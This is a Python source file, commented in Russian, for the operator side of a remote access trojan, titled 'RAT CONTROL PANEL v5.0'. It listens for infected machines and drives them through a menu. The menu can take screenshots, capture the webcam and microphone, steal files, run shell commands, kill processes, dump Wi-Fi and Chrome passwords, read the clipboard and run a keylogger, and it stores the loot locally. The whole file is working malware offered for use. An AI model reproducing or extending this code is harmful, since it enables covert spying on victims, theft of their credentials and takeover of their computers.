#!/usr/bin/env python3
import socket
import os
import sys
import time
from datetime import datetime

# ========== ЦВЕТА ==========
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"
# ============================

HOST = "0.0.0.0"
PORT = 5555
SAVE_DIR = "rat_data"

# Создаём папки
for folder in ["screenshots", "files", "logs", "webcam"]:
    os.makedirs(os.path.join(SAVE_DIR, folder), exist_ok=True)

def log(msg, level="info"):
    time_str = datetime.now().strftime("%H:%M:%S")
    colors = {"ok": GREEN, "error": RED, "wait": YELLOW, "cmd": PURPLE, "success": CYAN, "info": BLUE}
    print(f"{colors.get(level, WHITE)}[{time_str}] {msg}{RESET}")
    
    # Лог в файл
    with open(os.path.join(SAVE_DIR, "logs", f"session_{datetime.now().strftime('%Y-%m-%d')}.log"), "a") as f:
        f.write(f"[{time_str}] {msg}\n")

def show_banner():
    os.system("clear")
    print(f"{RED}{BOLD}╔════════════════════════════════════════╗")
    print(f"║       RAT CONTROL PANEL v5.0         ║")
    print(f"╚════════════════════════════════════════╝{RESET}")
    print(f"{GREEN}▶ IP:{RESET} {socket.gethostbyname(socket.gethostname())}")
    print(f"{GREEN}▶ Папка:{RESET} {os.path.abspath(SAVE_DIR)}")

def show_menu():
    print(f"""
{CYAN} 1.{RESET} 📸 Скриншот        {CYAN}9.{RESET}  🔄 Процессы
{CYAN} 2.{RESET} 🎥 Веб-камера      {CYAN}10.{RESET} 🌐 Сеть
{CYAN} 3.{RESET} 🎙 Микрофон        {CYAN}11.{RESET} 🔑 Пароли
{CYAN} 4.{RESET} ⬇️ Скачать файл    {CYAN}12.{RESET} 📋 Буфер
{CYAN} 5.{RESET} ⬆️ Загрузить файл  {CYAN}13.{RESET} ⌨️ Кейлоггер
{CYAN} 6.{RESET} 💻 Команда         {CYAN}14.{RESET} ℹ️ Инфо
{CYAN} 7.{RESET} 📂 Файлы           {CYAN}15.{RESET} 🧹 Очистить
{CYAN} 8.{RESET} 📜 История         {RED}0.{RESET}  🚪 Выход
""")

def save_screenshot(data):
    path = os.path.join(SAVE_DIR, "screenshots", f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    with open(path, "wb") as f: f.write(data)
    log(f"✅ Скриншот: {os.path.basename(path)}", "success")

def save_file(data, name):
    path = os.path.join(SAVE_DIR, "files", f"stolen_{os.path.basename(name)}")
    with open(path, "wb") as f: f.write(data)
    log(f"✅ Файл: {os.path.basename(path)}", "success")

def handle_client(client, addr):
    history = []
    log(f"✅ Клиент: {addr[0]}:{addr[1]}", "ok")
    
    # Получаем информацию
    try:
        client.send(b"SYSTEM_INFO")
        data = client.recv(4096).decode()
        log(f"📋 {data[:50]}...", "info")
    except: pass
    
    while True:
        show_menu()
        choice = input(f"\n{YELLOW}⚡ Введите номер{RESET} > ").strip()
        
        if choice == "0":
            client.send(b"EXIT")
            break
        
        # ===== 1. СКРИНШОТ =====
        elif choice == "1":
            log("📸 Скриншот...", "cmd")
            client.send(b"SCREEN")
            try:
                response = client.recv(1024).decode()
                if response.isdigit():
                    size = int(response)
                    client.send(b"OK")
                    data = b""
                    while len(data) < size:
                        data += client.recv(4096)
                    save_screenshot(data)
                    history.append("SCREEN")
                else:
                    log(f"❌ {response}", "error")
            except Exception as e:
                log(f"❌ {e}", "error")
        
        # ===== 2. ВЕБ-КАМЕРА =====
        elif choice == "2":
            log("🎥 Веб-камера...", "cmd")
            client.send(b"WEBCAM")
            try:
                response = client.recv(1024).decode()
                if response.isdigit():
                    size = int(response)
                    client.send(b"OK")
                    data = b""
                    while len(data) < size:
                        data += client.recv(4096)
                    path = os.path.join(SAVE_DIR, "webcam", f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
                    with open(path, "wb") as f: f.write(data)
                    log(f"✅ Фото: {os.path.basename(path)}", "success")
                    history.append("WEBCAM")
                else:
                    log(f"❌ {response}", "error")
            except Exception as e:
                log(f"❌ {e}", "error")
        
        # ===== 3. МИКРОФОН =====
        elif choice == "3":
            sec = input(f"{YELLOW}⏱ Секунд{RESET}: ").strip()
            if not sec.isdigit(): continue
            log(f"🎙 Микрофон {sec}с...", "cmd")
            client.send(f"MIC {sec}".encode())
            try:
                response = client.recv(1024).decode()
                if response.isdigit():
                    size = int(response)
                    client.send(b"OK")
                    data = b""
                    while len(data) < size:
                        data += client.recv(4096)
                    path = os.path.join(SAVE_DIR, "files", f"mic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav")
                    with open(path, "wb") as f: f.write(data)
                    log(f"✅ Запись: {os.path.basename(path)}", "success")
                    history.append("MIC")
                else:
                    log(f"❌ {response}", "error")
            except Exception as e:
                log(f"❌ {e}", "error")
        
        # ===== 4. СКАЧАТЬ ФАЙЛ =====
        elif choice == "4":
            path = input(f"{YELLOW}📁 Путь{RESET}: ").strip()
            if not path: continue
            log(f"⬇️ {path}", "cmd")
            client.send(f"GET {path}".encode())
            try:
                response = client.recv(1024).decode()
                if response.isdigit():
                    size = int(response)
                    client.send(b"OK")
                    data = b""
                    while len(data) < size:
                        data += client.recv(4096)
                    save_file(data, path)
                    history.append(f"GET {path}")
                else:
                    log(f"❌ {response}", "error")
            except Exception as e:
                log(f"❌ {e}", "error")
        
        # ===== 5. ЗАГРУЗИТЬ ФАЙЛ =====
        elif choice == "5":
            local = input(f"{YELLOW}📁 Локальный{RESET}: ").strip()
            remote = input(f"{YELLOW}📁 На жертве{RESET}: ").strip()
            if not os.path.exists(local): 
                log("❌ Файл не найден", "error")
                continue
            size = os.path.getsize(local)
            log(f"⬆️ {os.path.basename(local)} ({size} байт)", "cmd")
            client.send(f"UPLOAD {remote}|{size}".encode())
            if client.recv(1024).decode() == "READY":
                with open(local, "rb") as f:
                    client.sendall(f.read())
                log(client.recv(1024).decode(), "ok")
                history.append(f"UPLOAD {local}")
        
        # ===== 6. КОМАНДА =====
        elif choice == "6":
            cmd = input(f"{YELLOW}💻 Команда{RESET}: ").strip()
            if not cmd: continue
            log(f"⚡ {cmd}", "cmd")
            client.send(f"CMD {cmd}".encode())
            data = client.recv(65535).decode()
            print(f"\n{CYAN}{data}{RESET}\n")
            history.append(f"CMD {cmd}")
        
        # ===== 7. ФАЙЛОВЫЙ МЕНЕДЖЕР =====
        elif choice == "7":
            path = input(f"{YELLOW}📂 Путь{RESET}: ").strip() or "."
            client.send(f"LIST {path}".encode())
            print(f"\n{CYAN}{client.recv(65535).decode()}{RESET}\n")
            history.append(f"LIST {path}")
        
        # ===== 8. ИСТОРИЯ =====
        elif choice == "8":
            print(f"\n{CYAN}История:{RESET}")
            for i, h in enumerate(history[-10:], 1): print(f"{i}. {h}")
        
        # ===== 9. ПРОЦЕССЫ =====
        elif choice == "9":
            print("1. Список\n2. Убить")
            sub = input("> ").strip()
            if sub == "1":
                client.send(b"PS_LIST")
                print(client.recv(65535).decode())
            elif sub == "2":
                pid = input("PID: ").strip()
                client.send(f"PS_KILL {pid}".encode())
                log(client.recv(1024).decode(), "ok")
        
        # ===== 10. СЕТЬ =====
        elif choice == "10":
            print("1. IPConfig\n2. ARP\n3. Ports")
            sub = input("> ").strip()
            cmd = {"1": "NET_IPCONFIG", "2": "NET_ARP", "3": "NET_PORTS"}.get(sub)
            if cmd:
                client.send(cmd.encode())
                print(client.recv(65535).decode())
        
        # ===== 11. ПАРОЛИ =====
        elif choice == "11":
            print("1. Wi-Fi\n2. Chrome")
            sub = input("> ").strip()
            cmd = {"1": "PASS_WIFI", "2": "PASS_CHROME"}.get(sub)
            if cmd:
                client.send(cmd.encode())
                data = client.recv(65535).decode()
                print(data)
                path = os.path.join(SAVE_DIR, "files", f"pass_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
                with open(path, "w") as f: f.write(data)
                log(f"✅ Пароли сохранены", "success")
        
        # ===== 12. БУФЕР =====
        elif choice == "12":
            client.send(b"CLIPBOARD")
            data = client.recv(4096).decode()
            print(f"\n{CYAN}{data}{RESET}\n")
            if data and data != "(пусто)":
                path = os.path.join(SAVE_DIR, "files", f"clip_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
                with open(path, "w") as f: f.write(data)
                log(f"✅ Буфер сохранён", "success")
        
        # ===== 13. КЕЙЛОГГЕР =====
        elif choice == "13":
            print("1. Старт\n2. Получить")
            sub = input("> ").strip()
            if sub == "1":
                client.send(b"KEYLOG_START")
                log(client.recv(1024).decode(), "ok")
            elif sub == "2":
                client.send(b"KEYLOG_GET")
                data = client.recv(65535).decode()
                path = os.path.join(SAVE_DIR, "files", f"keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
                with open(path, "w") as f: f.write(data)
                log(f"✅ Логи: {os.path.basename(path)}", "success")
        
        # ===== 14. ИНФО =====
        elif choice == "14":
            client.send(b"SYSTEM_INFO")
            print(f"\n{CYAN}{client.recv(4096).decode()}{RESET}\n")
        
        # ===== 15. ОЧИСТИТЬ =====
        elif choice == "15":
            show_banner()

# ===== ЗАПУСК =====
server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen(5)

show_banner()
log(f"✅ Сервер на порту {PORT}", "ok")

while True:
    log("🟡 Ожидание...", "wait")
    try:
        client, addr = server.accept()
        handle_client(client, addr)
    except KeyboardInterrupt:
        break

server.close()
log("👋 Выход", "wait")
